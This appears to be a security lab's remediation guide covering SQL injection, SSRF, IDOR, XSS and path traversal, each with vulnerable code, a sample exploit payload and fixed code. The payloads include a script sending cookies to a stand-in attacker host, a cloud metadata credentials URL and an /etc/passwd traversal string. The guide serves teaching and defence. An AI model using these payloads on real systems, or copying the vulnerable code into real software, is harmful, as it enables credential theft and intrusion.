# VAPT Remediation Guide: Vulnerabilities, Exploits & Defenses

This guide documents the root causes, proof-of-concept exploit payloads, and production remediations for the Top 5 Application Security Vulnerabilities implemented in this lab.

---

## 1. SQL Injection (SQLi) - CWE-89 / OWASP A03

### Root Cause
Direct concatenation of untrusted user input into an unparameterized SQL statement string, allowing the attacker to break out of data context and modify the SQL AST (Abstract Syntax Tree).

### Vulnerable Code
```python
# Unsafe string interpolation
query = f"SELECT id, username, email FROM users WHERE username = '{username}'"
rows = cursor.execute(query).fetchall()
```

### Exploit Payload
```sql
' OR 1=1 --
```
*Result*: The query evaluates to `WHERE username = '' OR 1=1`, returning every user record in the database.

### Remediated Code
```python
# Parameterized query with bound placeholder
query = "SELECT id, username, email FROM users WHERE username = ?"
rows = cursor.execute(query, (username,)).fetchall()
```
*Defense*: The database driver treats user input strictly as a literal scalar value, preventing query structure tampering.

---

## 2. Server-Side Request Forgery (SSRF) - CWE-918 / OWASP A10

### Root Cause
The backend server accepts a user-supplied URL and initiates an outbound HTTP request without validating the target protocol or checking whether the resolved IP belongs to internal or cloud-metadata network segments.

### Vulnerable Code
```python
# Unvalidated URL fetch
resp = requests.get(user_url)
```

### Exploit Payload
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
*Result*: Leaks AWS/GCP cloud instance IAM credentials and allows port scanning of internal VPC services (`http://127.0.0.1:6379`, `http://10.0.0.1/`).

### Remediated Code
```python
# Strict scheme check, DNS resolution, and RFC 1918/3927 IP filtering
parsed = urllib.parse.urlparse(user_url)
if parsed.scheme not in ("http", "https"):
    raise ValueError("Invalid scheme")

ip_str = socket.gethostbyname(parsed.hostname)
ip = ipaddress.ip_address(ip_str)

if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
    raise PermissionError("Access to internal/private network addresses is blocked")
```

---

## 3. Insecure Direct Object Reference (IDOR) - CWE-639 / OWASP A01

### Root Cause
The application accepts an object identifier from the client and retrieves data directly from storage without validating that the authenticated session owns or is authorized to view that object.

### Vulnerable Code
```python
# No ownership check
invoice = db.query(Invoice).filter_by(id=invoice_id).first()
return invoice
```

### Exploit Payload
```http
GET /vulnerable/invoices/101 HTTP/1.1
X-User-ID: 2  # Attacker is User 2, accessing User 1's invoice 101
```

### Remediated Code
```python
# Explicit session ownership enforcement
invoice = db.query(Invoice).filter_by(id=invoice_id).first()
if not invoice:
    raise NotFound()

if invoice.user_id != current_user.id and current_user.role != "admin":
    raise Forbidden("Unauthorized access to requested record")
return invoice
```

---

## 4. Cross-Site Scripting (XSS) - CWE-79 / OWASP A03

### Root Cause
Reflecting user input into the browser DOM without contextual escaping, allowing an attacker to inject arbitrary client-side JavaScript that executes within the victim's session context.

### Vulnerable Code
```python
# Raw string reflection in HTML response
return HTMLResponse(f"<h1>Welcome, {name}!</h1>")
```

### Exploit Payload
```html
<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>
```

### Remediated Code
```python
# 1. HTML entity encoding
safe_name = html.escape(name)
response = HTMLResponse(f"<h1>Welcome, {safe_name}!</h1>")

# 2. Defense-in-depth: Strict Content Security Policy (CSP)
response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'none';"
return response
```

---

## 5. Path Traversal / Arbitrary File Read - CWE-22 / OWASP A01

### Root Cause
Constructing filesystem paths using unvalidated user input containing directory traversal sequences (`../`), allowing reading files outside the designated root directory.

### Vulnerable Code
```python
# Unchecked os.path.join
target = os.path.join(PUBLIC_DIR, user_filename)
return open(target).read()
```

### Exploit Payload
```
../../../../etc/passwd
```

### Remediated Code
```python
# Canonical path resolution with relative boundary enforcement
base_dir = PUBLIC_DIR.resolve()
target_path = (base_dir / user_filename).resolve()

# Enforce target remains inside base_dir
try:
    target_path.relative_to(base_dir)
except ValueError:
    raise Forbidden("Directory traversal detected")

return target_path.read_text()
```
